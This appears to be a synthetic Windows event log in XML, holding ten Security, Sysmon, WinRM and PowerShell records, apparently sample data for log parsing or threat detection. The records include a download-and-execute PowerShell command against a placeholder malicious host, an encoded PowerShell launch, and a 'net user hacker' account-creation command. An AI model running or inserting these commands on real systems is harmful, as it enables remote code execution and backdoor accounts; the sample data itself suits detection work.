<?xml version="1.0" encoding="utf-8"?>
<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4624</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:35:22.123456Z" />
      <EventRecordID>12345</EventRecordID>
      <Correlation />
      <Execution ProcessID="732" ThreadID="1024" />
      <Channel>Security</Channel>
      <Computer>WORKSTATION01</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="SubjectDomainName">NT AUTHORITY</Data>
      <Data Name="TargetUserName">Administrator</Data>
      <Data Name="TargetDomainName">DOMAIN</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="IpAddress">192.168.1.100</Data>
      <Data Name="IpPort">49152</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4625</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8010000000000000</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:36:45.789012Z" />
      <EventRecordID>12346</EventRecordID>
      <Correlation />
      <Execution ProcessID="732" ThreadID="1024" />
      <Channel>Security</Channel>
      <Computer>WORKSTATION01</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="SubjectDomainName">NT AUTHORITY</Data>
      <Data Name="TargetUserName">baduser</Data>
      <Data Name="TargetDomainName">DOMAIN</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="FailureReason">Unknown user name or bad password</Data>
      <Data Name="IpAddress">10.0.0.5</Data>
      <Data Name="IpPort">49153</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-WinRM" Guid="{a7975c8f-ac13-49f1-87da-5a984a4ab417}" />
      <EventID>142</EventID>
      <Version>0</Version>
      <Level>2</Level>
      <Task>0</Task>
      <Opcode>0</Opcode>
      <Keywords>0x4000000000000000</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:37:10.456789Z" />
      <EventRecordID>12347</EventRecordID>
      <Correlation />
      <Execution ProcessID="1234" ThreadID="5678" />
      <Channel>Microsoft-Windows-WinRM/Operational</Channel>
      <Computer>WORKSTATION02</Computer>
      <Security UserID="S-1-5-20" />
    </System>
    <EventData>
      <Data Name="Error">WSMan operation Enumeration failed</Data>
      <Data Name="ClientIP">203.0.113.25</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:38:22.111111Z" />
      <EventRecordID>12348</EventRecordID>
      <Correlation />
      <Execution ProcessID="2468" ThreadID="3692" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WORKSTATION01</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2023-10-15 14:38:22.111</Data>
      <Data Name="ProcessGuid">{12345678-1234-1234-1234-123456789012}</Data>
      <Data Name="ProcessId">4567</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="CommandLine">cmd.exe /c "powershell -enc BASE64HERE"</Data>
      <Data Name="User">DOMAIN\Administrator</Data>
      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\services.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4624</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:39:05.222222Z" />
      <EventRecordID>12349</EventRecordID>
      <Correlation />
      <Execution ProcessID="732" ThreadID="1024" />
      <Channel>Security</Channel>
      <Computer>SERVER01</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="SubjectDomainName">NT AUTHORITY</Data>
      <Data Name="TargetUserName">svcadmin</Data>
      <Data Name="TargetDomainName">DOMAIN</Data>
      <Data Name="LogonType">5</Data>
      <Data Name="IpAddress">127.0.0.1</Data>
      <Data Name="IpPort">0</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4625</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8010000000000000</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:40:15.333333Z" />
      <EventRecordID>12350</EventRecordID>
      <Correlation />
      <Execution ProcessID="732" ThreadID="1024" />
      <Channel>Security</Channel>
      <Computer>WORKSTATION01</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="SubjectDomainName">NT AUTHORITY</Data>
      <Data Name="TargetUserName">admin</Data>
      <Data Name="TargetDomainName">DOMAIN</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="FailureReason">Account locked out</Data>
      <Data Name="IpAddress">192.168.1.100</Data>
      <Data Name="IpPort">49154</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4672</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>12548</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:41:30.444444Z" />
      <EventRecordID>12351</EventRecordID>
      <Correlation />
      <Execution ProcessID="732" ThreadID="1024" />
      <Channel>Security</Channel>
      <Computer>SERVER01</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-123456789-123456789-123456789-500</Data>
      <Data Name="SubjectUserName">Administrator</Data>
      <Data Name="SubjectDomainName">DOMAIN</Data>
      <Data Name="PrivilegeList">SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
      <EventID>4104</EventID>
      <Version>1</Version>
      <Level>3</Level>
      <Task>2</Task>
      <Opcode>15</Opcode>
      <Keywords>0x0</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:42:50.555555Z" />
      <EventRecordID>12352</EventRecordID>
      <Correlation ActivityID="{12345678-1234-1234-1234-123456789012}" />
      <Execution ProcessID="3456" ThreadID="7890" />
      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
      <Computer>WORKSTATION02</Computer>
      <Security UserID="S-1-5-21-123456789-123456789-123456789-1001" />
    </System>
    <EventData>
      <Data Name="ScriptBlockText">Invoke-WebRequest -Uri "http://malicious.example.com/payload.ps1" | Invoke-Expression</Data>
      <Data Name="Path">C:\Users\user\AppData\Local\Temp\script.ps1</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:43:15.666666Z" />
      <EventRecordID>12353</EventRecordID>
      <Correlation />
      <Execution ProcessID="732" ThreadID="1024" />
      <Channel>Security</Channel>
      <Computer>WORKSTATION01</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-123456789-123456789-123456789-1001</Data>
      <Data Name="SubjectUserName">user</Data>
      <Data Name="SubjectDomainName">DOMAIN</Data>
      <Data Name="NewProcessName">C:\Windows\System32\net.exe</Data>
      <Data Name="CommandLine">net user hacker P@ssw0rd /add</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4624</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2023-10-15T14:44:00.777777Z" />
      <EventRecordID>12354</EventRecordID>
      <Correlation />
      <Execution ProcessID="732" ThreadID="1024" />
      <Channel>Security</Channel>
      <Computer>SERVER01</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="SubjectDomainName">NT AUTHORITY</Data>
      <Data Name="TargetUserName">Administrator</Data>
      <Data Name="TargetDomainName">DOMAIN</Data>
      <Data Name="LogonType">10</Data>
      <Data Name="IpAddress">192.168.1.50</Data>
      <Data Name="IpPort">3389</Data>
    </EventData>
  </Event>
</Events>
